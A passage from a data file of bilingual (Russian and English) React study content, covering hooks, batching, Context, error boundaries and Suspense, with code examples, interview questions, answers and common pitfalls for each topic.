            "function handleClick() {\n  setCount(c => c + 1);\n  setFlag(f => !f);\n  // React 18: оба обновления объединяются в один ре-рендер,\n  // даже если этот код вызван внутри setTimeout или .then()\n}\n\nimport { flushSync } from 'react-dom';\nfunction handleClickSync() {\n  flushSync(() => setCount(c => c + 1)); // принудительно синхронно, вне батчинга\n  console.log(document.getElementById('count').textContent); // уже обновлённый DOM\n}",
          interviewQuestion: "Чем automatic batching в React 18 отличается от батчинга в React 17?",
          interviewAnswerRu:
            "В React 17 батчинг работал только для обновлений, вызванных внутри собственных обработчиков событий React — вызовы setState внутри setTimeout, промисов или нативных обработчиков событий каждый приводили к отдельному немедленному ре-рендеру. React 18 ввёл automatic batching: теперь React батчит обновления состояния независимо от того, откуда они инициированы, включая асинхронный код — это уменьшает число лишних рендеров без изменения кода компонентов, а для редких случаев, где нужен именно немедленный синхронный рендер, добавлен отдельный API flushSync.",
          interviewAnswerEn:
            "In React 17, batching only happened for updates triggered inside React's own event handlers — setState calls inside setTimeout, promises, or native event handlers each caused an immediate separate re-render. React 18 introduced automatic batching: React now batches state updates regardless of where they originate, including async code — cutting down unnecessary re-renders with no changes to component code, and for the rare cases needing an immediate synchronous render, a dedicated flushSync API was added.",
          pitfalls: [
            "Полагаться на то, что состояние 'уже обновилось' сразу после setState внутри одного обработчика — обновление применяется асинхронно после батчинга, а не мгновенно.",
            "Злоупотреблять flushSync там, где обычный батчинг был бы более производительным и достаточным.",
          ],
        },
      },
      {
        id: "react-rules-of-hooks",
        title: "Rules of Hooks",
        content: {
          title: "Rules of Hooks",
          shortExplanation:
            "Два жёстких правила использования хуков: вызывать их только на верхнем уровне функционального компонента (не внутри условий, циклов, вложенных функций) и только из React-компонентов или других хуков — эти правила существуют не как стиль кода, а потому что от них зависит корректная работа React.",
          detailedExplanation:
            "React не хранит хуки по имени переменной — он сопоставляет вызовы useState/useEffect/... по порядковому номеру вызова в конкретном рендере, используя внутренний связный список. Если хук условно пропускается (if (condition) { useState(...) }), порядковые номера всех последующих хуков в этом рендере смещаются относительно предыдущего рендера, и React связывает состояние не с тем хуком, для которого оно изначально предназначалось — это приводит к трудноуловимым багам, а не к ошибке компиляции. Правило 'вызывать хуки только из компонентов/других хуков' обеспечивает, что React вообще может отследить, к какому 'месту в дереве' привязан конкретный вызов хука — обычная (не хук) функция для React невидима с точки зрения этого механизма отслеживания. ESLint-плагин eslint-plugin-react-hooks с правилом rules-of-hooks — стандартный способ ловить нарушения этих правил автоматически, до того как они попадут в продакшен как трудноуловимый баг.",
          codeExample:
            "// Неправильно — хук внутри условия\nfunction Component({ isReady }) {\n  if (isReady) {\n    const [value, setValue] = useState(''); // нарушение правил хуков\n  }\n}\n\n// Правильно — хук всегда на верхнем уровне, условие внутри\nfunction Component({ isReady }) {\n  const [value, setValue] = useState('');\n  if (!isReady) return null;\n  // ...\n}",
          interviewQuestion: "Почему нельзя вызывать хук внутри if, а обычную переменную — можно?",
          interviewAnswerRu:
            "React связывает состояние каждого useState/useEffect не с именем переменной в коде, а с порядковым номером вызова хука в рамках одного рендера, храня их во внутреннем связном списке для конкретного экземпляра компонента. Если хук вызывается условно, то в рендере, где условие не выполнилось, все последующие хуки сдвигаются на одну позицию раньше — и React связывает их состояние с 'чужим' хуком, а не с тем, для которого оно предназначалось изначально. Обычная переменная, в отличие от этого, не зависит от порядка вызовов между рендерами — она просто существует в текущей области видимости функции.",
          interviewAnswerEn:
            "React ties each useState/useEffect's state not to a variable name in the code, but to the call's ordinal position within a single render, keeping them in an internal linked list per component instance. If a hook is called conditionally, then in a render where the condition doesn't hold, every following hook shifts one position earlier — and React ends up associating their state with the wrong hook, not the one it was originally meant for. A regular variable, by contrast, doesn't depend on call order between renders — it simply exists in the function's current scope.",
          pitfalls: [
            "Оборачивать вызов хука в условие или ранний return, размещённый до хуков.",
            "Игнорировать предупреждения eslint-plugin-react-hooks, считая их 'просто стилем', а не защитой от реальных багов состояния.",
          ],
        },
      },
      {
        id: "react-usestate",
        title: "useState",
        content: {
          title: "useState",
          shortExplanation:
            "useState — базовый хук для локального состояния компонента: возвращает пару [значение, функция-сеттер], а вызов сеттера планирует ре-рендер с новым значением, а не изменяет значение немедленно и синхронно.",
          detailedExplanation:
            "Аргумент, переданный в useState, используется только при самом первом рендере компонента — при последующих рендерах React игнорирует его и возвращает актуальное сохранённое значение состояния. Если начальное значение вычисляется дорогой операцией, вместо useState(computeExpensive()) стоит передавать функцию useState(() => computeExpensive()) — 'ленивую инициализацию', которая выполнится только один раз, при монтировании, а не на каждом рендере (хотя результат при повторных рендерах и так игнорируется, сама функция computeExpensive() иначе вызывалась бы впустую каждый раз). Сеттер поддерживает функциональную форму setValue(prev => prev + 1), которая гарантированно работает с актуальным предыдущим значением даже при нескольких обновлениях подряд в одном событии — в отличие от setValue(value + 1), которое использует значение value, захваченное текущим замыканием рендера, и может дать неверный результат при батчинге нескольких обновлений.",
          codeExample:
            "function Counter() {\n  const [count, setCount] = useState(0);\n\n  function incrementTwice() {\n    setCount(count + 1); // оба используют одно и то же 'старое' count из замыкания\n    setCount(count + 1); // итог: +1, а не +2 — неожиданно для новичков\n  }\n\n  function incrementTwiceCorrect() {\n    setCount(prev => prev + 1); // каждый вызов видит актуальный prev\n    setCount(prev => prev + 1); // итог: +2 — корректно\n  }\n}",
          interviewQuestion: "Почему двойной вызов setCount(count + 1) подряд увеличивает счётчик только на 1, а не на 2?",
          interviewAnswerRu:
            "count внутри обработчика — это значение, захваченное замыканием на момент текущего рендера, и оно не меняется между двумя вызовами setCount в рамках одного и того же обработчика события, даже если бы обновления применялись не батчами. Оба вызова setCount(count + 1) вычисляют одно и то же новое значение из одного и того же старого count, поэтому итоговое состояние — 'старое значение + 1', а не 'плюс 2'. Функциональная форма setCount(prev => prev + 1) решает эту проблему, потому что React гарантированно передаёт в неё актуальное состояние на момент фактического применения обновления, а не значение, зафиксированное в замыкании рендера.",
          interviewAnswerEn:
            "count inside the handler is the value captured by the closure at the time of the current render, and it doesn't change between two setCount calls within the same event handler, even if updates weren't batched at all. Both setCount(count + 1) calls compute the same new value from the same old count, so the resulting state ends up as 'old value + 1', not 'plus 2'. The functional form setCount(prev => prev + 1) fixes this because React guarantees it receives the actual state at the moment the update is applied, rather than the value frozen inside the render's closure.",
          pitfalls: [
            "Обновлять состояние несколько раз подряд через 'значение + 1' вместо функциональной формы, ожидая накопительного эффекта.",
            "Передавать в useState результат дорогого вычисления напрямую вместо ленивой инициализации через функцию.",
          ],
        },
      },
      {
        id: "react-useeffect",
        title: "useEffect",
        content: {
          title: "useEffect",
          shortExplanation:
            "useEffect синхронизирует компонент с чем-то внешним по отношению к React (сеть, подписки, таймеры, работа с DOM напрямую) и выполняется после того, как React уже обновил реальный DOM (после commit), а не во время самого рендера.",
          detailedExplanation:
            "Массив зависимостей — это не просто 'список переменных, при изменении которых нужно перезапустить эффект', а декларация всего, что эффект реально читает из внешней (по отношению к самому эффекту) области видимости компонента: если внутри эффекта используется проп или состояние, его нужно указать в зависимостях, иначе эффект будет работать со значением, зафиксированным на момент своего создания (устаревшим замыканием), а не с актуальным. Пустой массив зависимостей [] означает 'запустить один раз при монтировании и никогда не перезапускать', а отсутствие массива вовсе означает 'перезапускать после каждого рендера без исключения' — это разные, легко перепутываемые режимы. Функция очистки, возвращённая из эффекта, вызывается перед каждым следующим запуском того же эффекта и перед размонтированием — она обязательна для всего, что 'открывает' что-то внешнее (подписку, соединение, таймер), чтобы не накапливать дублирующиеся подписки при каждом перезапуске эффекта.",
          codeExample:
            "function ChatRoom({ roomId }) {\n  useEffect(() => {\n    const connection = createConnection(roomId);\n    connection.connect();\n    return () => connection.disconnect(); // обязательная очистка перед следующим запуском\n  }, [roomId]); // эффект перезапускается именно при смене roomId, не при любом рендере\n}",
          interviewQuestion: "Что произойдёт, если использовать переменную из пропсов внутри useEffect, но не указать её в массиве зависимостей?",
          interviewAnswerRu:
            "ESLint-плагин exhaustive-deps предупредит об этом, и не просто из вредности: замыкание эффекта захватит значение переменной таким, каким оно было на момент создания этого конкретного вызова эффекта, и при последующих рендерах, где переменная изменилась, эффект не перезапустится и продолжит работать со старым (устаревшим) значением — это классический баг stale closure применительно конкретно к useEffect.",
          interviewAnswerEn:
            "The exhaustive-deps ESLint rule will flag it, and not out of pedantry: the effect's closure captures the variable's value as it was at the time that particular effect instance was created, and on later renders where the variable changed, the effect won't re-run and keeps working with the old (stale) value — a classic stale closure bug specifically applied to useEffect.",
          pitfalls: [
            "Игнорировать предупреждения exhaustive-deps и добавлять переменные в зависимости 'выборочно', вручную решая, какие важны, а какие нет.",
            "Путать пустой массив зависимостей [] (запуск один раз) с полным отсутствием массива (запуск после каждого рендера).",
          ],
        },
      },
      {
        id: "react-uselayouteffect",
        title: "useLayoutEffect",
        content: {
          title: "useLayoutEffect",
          shortExplanation:
            "useLayoutEffect похож на useEffect по сигнатуре, но выполняется синхронно сразу после того, как React обновил DOM, и до того, как браузер успевает отрисовать (paint) этот кадр на экране — используется, когда нужно измерить или скорректировать DOM до того, как пользователь увидит промежуточное состояние.",
          detailedExplanation:
            "useEffect выполняется асинхронно после paint — это значит, что если внутри эффекта вы меняете DOM (например, позиционируете тултип на основе размеров элемента), пользователь может на долю секунды увидеть 'неправильное' положение до того, как эффект успеет его поправить (визуальное мерцание, flicker). useLayoutEffect блокирует браузер от отрисовки кадра, пока не выполнится — поэтому он гарантированно завершится до того, как что-либо станет видно пользователю, ценой того, что тяжёлая работа внутри useLayoutEffect реально задерживает отрисовку экрана. Типичные легитимные случаи для useLayoutEffect: измерение размеров/позиции DOM-узла через getBoundingClientRect для точного позиционирования (тултипы, поповеры), синхронная коррекция scroll-позиции. Для подавляющего большинства эффектов (запросы, подписки, логирование) правильный выбор — useEffect, а не useLayoutEffect, потому что блокировка отрисовки без необходимости ухудшает воспринимаемую производительность.",
          codeExample:
            "function Tooltip({ targetRef }) {\n  const [position, setPosition] = useState({ top: 0, left: 0 });\n\n  useLayoutEffect(() => {\n    const rect = targetRef.current.getBoundingClientRect();\n    setPosition({ top: rect.bottom, left: rect.left }); // без мерцания — до paint\n  }, [targetRef]);\n\n  return <div style={position}>Tooltip content</div>;\n}",
          interviewQuestion: "В каком случае обычный useEffect вызовет заметное визуальное мерцание, а useLayoutEffect — нет?",
          interviewAnswerRu:
            "Если эффект синхронно меняет расположение или размер DOM-элемента на основе только что измеренных значений (например, позиционирует тултип относительно другого элемента), а вы используете useEffect, браузер успевает отрисовать кадр с 'исходным', ещё не скорректированным положением до того, как асинхронно выполнится эффект и всё поправит — пользователь на мгновение увидит неверную позицию. useLayoutEffect выполняется синхронно до paint, поэтому DOM уже будет скорректирован к моменту, когда браузер реально покажет кадр пользователю, и никакого мерцания не возникнет.",
          interviewAnswerEn:
            "If an effect synchronously repositions or resizes a DOM element based on values it just measured (say, positioning a tooltip relative to another element) and you use useEffect, the browser gets to paint a frame with the original, not-yet-corrected position before the effect runs asynchronously and fixes it — the user briefly sees the wrong position. useLayoutEffect runs synchronously before paint, so the DOM is already corrected by the time the browser actually shows the frame to the user, and no flicker occurs.",
          pitfalls: [
            "Использовать useLayoutEffect 'на всякий случай' вместо useEffect везде — это без необходимости блокирует отрисовку и ухудшает производительность.",
            "Делать тяжёлые синхронные вычисления внутри useLayoutEffect — они напрямую задерживают появление кадра на экране.",
          ],
        },
      },
      {
        id: "react-useref",
        title: "useRef",
        content: {
          title: "useRef",
          shortExplanation:
            "useRef создаёт изменяемый объект-контейнер { current: value }, который сохраняется между рендерами компонента, но, в отличие от useState, изменение current НЕ вызывает ре-рендер.",
          detailedExplanation:
            "useRef используется в двух принципиально разных сценариях: как ссылка на реальный DOM-узел (передаётся в атрибут ref JSX-элемента, чтобы получить прямой доступ к DOM в обход декларативной модели React — например, для .focus() или измерения размеров), и как 'изменяемая коробка' для произвольного значения, которое должно сохраняться между рендерами, но не должно вызывать перерисовку при изменении (id таймера, счётчик количества рендеров, предыдущее значение пропса для сравнения). Ключевое отличие от обычной переменной внутри функции компонента: обычная переменная создаётся заново при каждом рендере и теряет значение, тогда как ref.current — это один и тот же объект, физически переживающий все рендеры компонента. Мутировать ref.current напрямую (в отличие от setState) можно синхронно и в любой момент — но именно поэтому изменение ref не приводит к обновлению того, что видит пользователь на экране, если только это изменение отдельно не сопровождается вызовом setState.",
          codeExample:
            "function Stopwatch() {\n  const intervalRef = useRef(null); // хранит id таймера между рендерами\n  const [seconds, setSeconds] = useState(0);\n\n  function start() {\n    intervalRef.current = setInterval(() => setSeconds(s => s + 1), 1000);\n  }\n  function stop() {\n    clearInterval(intervalRef.current); // ref.current доступен без ре-рендера при изменении\n  }\n}",
          interviewQuestion: "Почему изменение ref.current не вызывает ре-рендер компонента, в отличие от setState?",
          interviewAnswerRu:
            "useState специально спроектирован так, чтобы вызов сеттера планировал ре-рендер — это его прямое назначение, механизм связи 'изменилось состояние -> нужно перерисовать UI'. useRef создан для другой задачи: хранить значение, которое должно пережить рендеры компонента, но не обязано (и часто не должно) влиять на то, что отображается на экране — например, id таймера или ссылку на DOM-узел. React физически не отслеживает изменения ref.current и не запускает из-за них никакой процесс сравнения/обновления, поэтому изменение ref 'молчаливо' с точки зрения UI, пока где-то отдельно не будет явно вызван setState.",
          interviewAnswerEn:
            "useState is specifically designed so that calling its setter schedules a re-render — that's its whole purpose, the 'state changed -> UI should redraw' mechanism. useRef exists for a different job: holding a value that should survive the component's renders but isn't meant to (and often shouldn't) affect what's on screen — like a timer id or a DOM node reference. React doesn't track changes to ref.current at all and triggers no diffing/update process because of them, so mutating a ref is silent from the UI's perspective until something separately calls setState.",
          pitfalls: [
            "Хранить в ref значение, которое реально должно отображаться в UI, и удивляться, что интерфейс не обновляется при его изменении.",
            "Читать/писать ref.current прямо во время рендера (а не в эффекте или обработчике) — это нарушает предсказуемость рендера как чистой функции.",
          ],
        },
      },
      {
        id: "react-usememo",
        title: "useMemo",
        content: {
          title: "useMemo",
          shortExplanation:
            "useMemo кеширует результат дорогого вычисления между рендерами и пересчитывает его заново только тогда, когда изменилась хотя бы одна из указанных зависимостей.",
          detailedExplanation:
            "Без useMemo дорогое вычисление (например, фильтрация и сортировка большого массива) выполнялось бы заново при каждом рендере компонента, даже если данные, от которых оно зависит, не менялись — useMemo(() => computeExpensive(data), [data]) гарантирует пересчёт только при изменении data. Важно понимать, что useMemo — это оптимизация, а не гарантия: React документирует, что в редких случаях (например, для экономии памяти при нехватке ресурсов) может 'забыть' закешированное значение и пересчитать его заново, даже если зависимости не менялись, поэтому вычисление внутри useMemo должно быть чистым и не иметь побочных эффектов, на которые полагается остальной код. Второе важное применение useMemo — не экономия вычислений как таковых, а сохранение referential equality объекта/массива между рендерами: если создавать новый объект пропсов на каждом рендере, это сломает React.memo дочернего компонента (он всегда увидит 'новые' пропсы по ссылке), а useMemo позволяет вернуть тот же самый объект, пока его логическое содержимое не изменилось.",
          codeExample:
            "function ProductList({ products, filterText }) {\n  const filteredProducts = useMemo(\n    () => products.filter(p => p.name.includes(filterText)),\n    [products, filterText] // пересчёт только при изменении списка или текста фильтра\n  );\n\n  return <List items={filteredProducts} />;\n}",
          interviewQuestion: "Зачем нужен useMemo для объекта, передаваемого в пропсы, если сам объект 'дёшево' создать?",
          interviewAnswerRu:
            "Дело не в стоимости создания самого объекта, а в referential equality: React.memo на дочернем компоненте сравнивает пропсы по ссылке (===), и новый объект {a: 1}, созданный на каждом рендере родителя, всегда будет 'другим' по ссылке, даже если его содержимое идентично предыдущему — из-за этого React.memo дочернего компонента бесполезен, он ре-рендерится при каждом рендере родителя. useMemo, обёртывающий создание такого объекта, возвращает один и тот же объект по ссылке, пока зависимости не изменились, что и делает мемоизацию дочернего компонента реально работающей.",
          interviewAnswerEn:
            "It's not about the cost of creating the object itself, but about referential equality: React.memo on a child component compares props by reference (===), and a fresh object {a: 1} created on every parent render will always be 'different' by reference, even if its content is identical to the previous one — which makes the child's React.memo useless, since it re-renders on every parent render regardless. useMemo wrapping that object's creation returns the exact same object reference as long as dependencies haven't changed, which is what actually makes the child's memoization work.",
          pitfalls: [
            "Оборачивать в useMemo простые дешёвые вычисления 'на всякий случай' — сам useMemo тоже не бесплатен (сравнение зависимостей, память под кеш).",
            "Забывать, что React может сбросить кеш useMemo в редких случаях, и полагаться на него как на гарантию побочного эффекта, а не только оптимизацию.",
          ],
        },
      },
      {
        id: "react-usecallback",
        title: "useCallback",
        content: {
          title: "useCallback",
          shortExplanation:
            "useCallback — частный случай useMemo специально для функций: он возвращает ту же самую ссылку на функцию между рендерами, пока не изменились указанные зависимости, вместо создания новой функции при каждом рендере.",
          detailedExplanation:
            "В JavaScript каждое объявление function (...) {...} или (...) => {...} создаёт новый объект-функцию, даже если тело функции текстуально идентично предыдущему — поэтому обычный обработчик, объявленный прямо в теле компонента, будет 'новым' по ссылке при каждом рендере. Это не имеет значения само по себе, но становится проблемой, если такая функция передаётся как проп в дочерний компонент, обёрнутый в React.memo, — 'новая' функция по ссылке заставляет memo решить, что пропсы изменились, и ре-рендерить дочерний компонент напрасно. useCallback(fn, deps) по сути эквивалентен useMemo(() => fn, deps) — он не ускоряет саму функцию, а лишь сохраняет её ссылку стабильной между рендерами, пока зависимости не изменились, что и делает мемоизацию дочерних компонентов реально эффективной.",
          codeExample:
            "function ParentComponent({ items }) {\n  const [query, setQuery] = useState('');\n\n  // Без useCallback handleSelect был бы новой функцией при каждом рендере\n  const handleSelect = useCallback((id) => {\n    console.log('selected', id);\n  }, []); // стабильная ссылка — не зависит от query\n\n  return <MemoizedList items={items} onSelect={handleSelect} />;\n}",
          interviewQuestion: "useCallback ускоряет саму функцию или что-то другое? В чём именно польза?",
          interviewAnswerRu:
            "useCallback никак не ускоряет выполнение самой функции — вызов обёрнутой и не обёрнутой функции занимает одинаковое время. Единственная польза — стабильность ссылки на функцию между рендерами: если эта функция передаётся как проп в компонент, обёрнутый в React.memo, стабильная ссылка позволяет memo реально пропускать лишние ре-рендеры, потому что проп-функция перестаёт казаться 'новой' при каждом рендере родителя. Без такого дочернего memo-компонента useCallback обычно не даёт практической пользы и добавляет лишние накладные расходы на сравнение зависимостей.",
          interviewAnswerEn:
            "useCallback doesn't speed up the function itself at all — calling a wrapped versus an unwrapped function takes the same time. Its only benefit is keeping the function's reference stable across renders: if that function is passed as a prop to a component wrapped in React.memo, a stable reference lets memo actually skip unnecessary re-renders, because the prop function stops looking 'new' on every parent render. Without such a memoized child component, useCallback typically provides no practical benefit and just adds the overhead of comparing dependencies.",
          pitfalls: [
            "Оборачивать каждый обработчик в useCallback 'по привычке', даже если он никуда не передаётся как проп в memo-компонент.",
            "Забывать зависимости внутри useCallback — стабильная ссылка на функцию со stale-замыканием так же опасна, как и обычный stale closure.",
          ],
        },
      },
      {
        id: "react-context",
        title: "Context",
        content: {
          title: "Context",
          shortExplanation:
            "Context позволяет передать значение через дерево компонентов без явной передачи через пропсы на каждом промежуточном уровне ('prop drilling') — Provider задаёт значение сверху, а любой компонент внутри может прочитать его через useContext.",
          detailedExplanation:
            "Context решает проблему передачи данных, нужных многим компонентам на разных уровнях вложенности (тема оформления, текущий пользователь, локаль), не протаскивая их пропсами через каждый промежуточный компонент, которому эти данные не нужны сами по себе, а нужны только чтобы передать их дальше. Ключевая особенность производительности: при изменении значения Context перерендериваются ВСЕ компоненты, которые читают этот контекст через useContext, независимо от того, какая именно часть значения им реально нужна — если Context хранит { user, theme, notifications } одним объектом, изменение notifications вызовет ре-рендер и у компонентов, которым нужен только theme. Именно поэтому Context — не замена полноценному стейт-менеджеру для часто меняющихся данных: для больших приложений с частыми обновлениями предпочитают Zustand/Redux/Jotai, где можно подписаться только на нужный конкретный срез состояния, либо разбивают один большой контекст на несколько маленьких, каждый со своим Provider.",
          codeExample:
            "const ThemeContext = createContext('light');\n\nfunction App() {\n  const [theme, setTheme] = useState('light');\n  return (\n    <ThemeContext.Provider value={theme}>\n      <Toolbar />\n    </ThemeContext.Provider>\n  );\n}\n\nfunction ThemedButton() {\n  const theme = useContext(ThemeContext); // без prop drilling через Toolbar\n  return <button className={theme}>Click</button>;\n}",
          interviewQuestion: "Почему Context не считается полноценной заменой Redux/Zustand для сложного состояния приложения?",
          interviewAnswerRu:
            "Context не умеет 'подписываться на часть значения' — если значение Context меняется, ре-рендерятся абсолютно все компоненты, читающие этот контекст через useContext, даже если им нужна только часть данных, которая не изменилась. Стейт-менеджеры вроде Zustand или Redux (через селекторы) позволяют компоненту подписаться именно на нужный ему срез состояния и ре-рендериться только при изменении именно этого среза — это делает их значительно эффективнее для часто меняющегося или сложного состояния, тогда как Context лучше подходит для редко меняющихся, 'глобальных' по своей природе значений.",
          interviewAnswerEn:
            "Context has no way to 'subscribe to part of a value' — if the Context value changes, every component reading that context via useContext re-renders, even if it only needs a portion of the data that didn't actually change. State managers like Zustand or Redux (via selectors) let a component subscribe to just the slice of state it needs and re-render only when that specific slice changes — making them significantly more efficient for frequently changing or complex state, while Context is better suited to rarely-changing, genuinely global values.",
          pitfalls: [
            "Складывать в один Context много не связанных друг с другом и часто меняющихся значений — любое изменение любого поля перерендерит всех потребителей.",
            "Использовать Context как замену полноценному стейт-менеджеру для часто обновляемых данных (например, состояния формы на каждое нажатие клавиши).",
          ],
        },
      },
      {
        id: "react-controlled-vs-uncontrolled",
        title: "Controlled vs Uncontrolled Components",
        content: {
          title: "Controlled vs Uncontrolled Components",
          shortExplanation:
            "Controlled-компонент хранит значение поля в React-состоянии, и DOM-элемент всегда отражает именно это состояние (value + onChange); uncontrolled-компонент хранит значение в самом DOM, а React читает его только при необходимости, обычно через ref.",
          detailedExplanation:
            "В controlled-подходе value инпута всегда равно значению из состояния React, а onChange обновляет это состояние при каждом изменении — это даёт React полный контроль над значением в реальном времени: можно валидировать при каждом нажатии клавиши, форматировать ввод на лету, синхронизировать несколько полей друг с другом. В uncontrolled-подходе (value не задаётся React, вместо этого используется defaultValue и ref) DOM сам хранит актуальное значение, а React получает его только в конкретный момент — например, при сабмите формы через inputRef.current.value — что снимает накладные расходы на ре-рендер при каждом нажатии клавиши, но не даёт валидации/форматирования в реальном времени без дополнительных обработчиков. Библиотеки форм вроде React Hook Form сознательно построены вокруг uncontrolled-подхода как базового режима именно ради производительности на больших формах, добавляя Controller как явный переходник для интеграции с controlled UI-компонентами (например, кастомными select/date picker).",
          codeExample:
            "// Controlled — React владеет значением в реальном времени\nfunction ControlledInput() {\n  const [value, setValue] = useState('');\n  return <input value={value} onChange={(e) => setValue(e.target.value)} />;\n}\n\n// Uncontrolled — значение живёт в DOM, React читает по требованию\nfunction UncontrolledInput() {\n  const inputRef = useRef(null);\n  function handleSubmit() {\n    console.log(inputRef.current.value); // читаем значение только когда нужно\n  }\n  return <input ref={inputRef} defaultValue=\"\" />;\n}",
          interviewQuestion: "Почему React Hook Form по умолчанию использует uncontrolled-подход, а не controlled?",
          interviewAnswerRu:
            "В controlled-подходе каждое нажатие клавиши в любом поле вызывает setState и, соответственно, ре-рендер компонента формы (а часто и всех связанных полей) — на большой форме с десятками полей это создаёт заметные накладные расходы на производительность. React Hook Form хранит значения полей в самом DOM (uncontrolled) и подписывается на изменения напрямую через ref и нативные события, обновляя React-состояние только тогда, когда это действительно нужно (валидация, сабмит) — это резко сокращает количество ре-рендеров на больших формах при сохранении удобного декларативного API.",
          interviewAnswerEn:
            "In the controlled approach, every keystroke in any field triggers setState and thus a re-render of the form component (often affecting related fields too) — on a large form with dozens of fields this creates noticeable performance overhead. React Hook Form keeps field values in the DOM itself (uncontrolled) and subscribes to changes directly via refs and native events, updating React state only when actually needed (validation, submit) — this sharply cuts down re-renders on large forms while still keeping a convenient declarative API.",
          pitfalls: [
            "Смешивать controlled и uncontrolled на одном и том же поле (то передавать value, то не передавать) — React предупредит об этом ошибкой в консоли.",
            "Использовать controlled-подход по умолчанию для очень больших форм без реальной необходимости в валидации на каждое нажатие — теряется производительность без пользы.",
          ],
        },
      },
      {
        id: "react-error-boundaries",
        title: "Error Boundaries",
        content: {
          title: "Error Boundaries",
          shortExplanation:
            "Error boundary — компонент (обязательно классовый, хуки для этого не существует), который перехватывает JavaScript-ошибки, произошедшие при рендере его дочерних компонентов, и показывает запасной UI вместо падения всего дерева.",
          detailedExplanation:
            "Error boundary реализуется через два специальных метода классового компонента: статический getDerivedStateFromError(error), который обновляет состояние, чтобы следующий рендер показал fallback-UI, и componentDidCatch(error, info), который используется для логирования ошибки (например, в Sentry). Error boundary перехватывает ошибки только при рендере, в lifecycle-методах и в конструкторах компонентов НИЖЕ себя по дереву — он не ловит ошибки в собственных обработчиках событий (onClick и подобные бросают ошибку синхронно, и её нужно ловить обычным try/catch), в асинхронном коде (setTimeout, промисы) и в самом себе. На практике error boundary оборачивают вокруг отдельных независимых частей интерфейса (виджет, секция страницы), а не вокруг всего приложения целиком, чтобы падение одного виджета не роняло весь экран — остальные части продолжают работать.",
          codeExample:
            "class ErrorBoundary extends React.Component {\n  state = { hasError: false };\n\n  static getDerivedStateFromError(error) {\n    return { hasError: true };\n  }\n\n  componentDidCatch(error, info) {\n    logErrorToService(error, info); // отправка в Sentry/Datadog и т.п.\n  }\n\n  render() {\n    if (this.state.hasError) return <FallbackUI />;\n    return this.props.children;\n  }\n}\n\n// <ErrorBoundary><WidgetThatMightThrow /></ErrorBoundary>",
          interviewQuestion: "Почему error boundary не перехватывает ошибку, брошенную внутри обработчика onClick?",
          interviewAnswerRu:
            "Error boundary создан специально для ошибок, возникающих в процессе рендера React-дерева — то есть в самих функциях компонентов, в lifecycle-методах, в конструкторах. Обработчик события вроде onClick выполняется вне процесса рендера, уже после того как React закончил рендерить и закоммитил изменения в DOM — с точки зрения React это обычный синхронный JavaScript-код, поэтому ошибки в нём нужно ловить стандартным try/catch внутри самого обработчика, а не полагаться на error boundary, которая их просто не увидит.",
          interviewAnswerEn:
            "An error boundary is specifically built for errors that occur during React's rendering process — that is, inside component functions themselves, lifecycle methods, and constructors. An event handler like onClick runs outside the rendering process, after React has already finished rendering and committed changes to the DOM — from React's perspective it's just ordinary synchronous JavaScript, so errors in it need to be caught with a regular try/catch inside the handler itself, rather than relying on an error boundary, which simply won't see them.",
          pitfalls: [
            "Ожидать, что error boundary поймает ошибку из асинхронного кода или обработчика события — это не входит в его зону ответственности.",
            "Оборачивать error boundary вокруг всего приложения одним большим блоком — падение любого виджета обрушивает весь экран вместо изолированного фрагмента.",
          ],
        },
      },
      {
        id: "react-suspense",
        title: "Suspense",
        content: {
          title: "Suspense",
          shortExplanation:
            "Suspense позволяет компоненту 'приостановить' рендер, пока не будут готовы нужные ему данные или код (lazy-загружаемый компонент), и показать fallback-UI (обычно спиннер или скелетон) вместо промежуточного неполного состояния.",
          detailedExplanation:
            "Изначально Suspense поддерживал только один сценарий 'из коробки' — code splitting через React.lazy(() => import('./Component')): пока модуль компонента ещё не загружен по сети, Suspense показывает fallback, а после загрузки — реальный компонент. С развитием экосистемы (Next.js App Router, React Server Components, библиотеки данных вроде Relay) Suspense научился работать и с загрузкой данных: компонент, который ещё не получил нужные данные, может 'бросить' промис, и ближайший родительский Suspense перехватит это, покажет fallback и автоматически повторит попытку рендера, когда промис разрешится. Несколько границ Suspense можно вкладывать друг в друга, чтобы разные части страницы показывали свои fallback независимо и подгружались параллельно, не блокируя друг друга — это особенно ценно для стриминга SSR, где сервер может отправить браузеру уже готовые части страницы, не дожидаясь самых медленных.",
          codeExample:
            "const ProfilePage = lazy(() => import('./ProfilePage'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<Spinner />}>\n      <ProfilePage /> {/* Suspense покажет Spinner, пока модуль грузится по сети */}\n    </Suspense>\n  );\n}",
          interviewQuestion: "Как Suspense для загрузки данных технически 'узнаёт', что компонент ещё не готов к рендеру?",
          interviewAnswerRu:
            "Компонент (или, чаще, библиотека данных вроде Relay или встроенный кеш React Server Components), когда данные ещё не готовы, синхронно бросает (throw) промис прямо во время рендера вместо обычного JSX. React перехватывает этот брошенный промис на уровне ближайшей родительской границы Suspense, показывает её fallback вместо сломанного дерева и подписывается на разрешение этого промиса, чтобы повторить попытку рендера компонента, когда данные наконец станут доступны.",
          interviewAnswerEn:
            "The component (or, more commonly, a data library like Relay, or React Server Components' built-in cache), when data isn't ready yet, synchronously throws a promise right during render instead of returning normal JSX. React catches that thrown promise at the level of the nearest parent Suspense boundary, shows its fallback instead of a broken tree, and subscribes to that promise's resolution to retry rendering the component once the data finally becomes available.",
          pitfalls: [
            "Пытаться реализовать Suspense для данных вручную без библиотеки, поддерживающей этот контракт (throw промиса) — это нетривиально и легко сделать неправильно.",
            "Оборачивать всю страницу одной границей Suspense вместо нескольких вложенных — теряется возможность независимой параллельной подгрузки разных секций.",
          ],
        },
      },
      {
        id: "react-concurrent-rendering",
        title: "Concurrent Rendering",
        content: {
          title: "Concurrent Rendering",
          shortExplanation:
            "Concurrent rendering — режим React, в котором рендер не обязан быть одним неразрывным синхронным блоком: React может начать рендерить обновление, приостановить его, если пришло что-то более срочное, и либо продолжить позже, либо вовсе отбросить незакоммиченный результат.",
          detailedExplanation:
